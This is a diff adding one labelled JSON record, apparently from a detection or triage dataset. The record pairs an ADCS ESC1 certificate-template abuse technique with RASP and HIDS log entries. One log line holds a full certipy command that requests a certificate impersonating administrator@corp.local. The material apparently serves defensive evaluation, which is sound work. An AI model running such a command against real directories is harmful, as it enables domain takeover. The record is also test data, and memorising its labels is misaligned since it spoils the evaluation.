@@ -1,0 +1,33 @@
+{
+ "unit": 1115,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "ADCS 证书模板滥用 ESC1（certsrv 申请 + certipy req 冒充域管）",
+ "sources": [
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-28 21:52:41",
+   "source": "rasp",
+   "log_id": "RASP0660210",
+   "content": "https://app-iis-64.ops-corp.com/certsrv/certfnsh.asp {\"adcs_esc1\": \"template=User\"} Mozilla/5.0 (Macintosh; In",
+   "event_id": "1115-RASP0660210"
+  },
+  {
+   "timestamp": "2026-07-28 21:53:55",
+   "source": "hids",
+   "log_id": "HID0646653",
+   "content": "certipy req -u jdoe@corp.local -ca CORP-CA -template User -upn administrator@corp.local <== /bin/bash -c",
+   "event_id": "1115-HID0646653"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
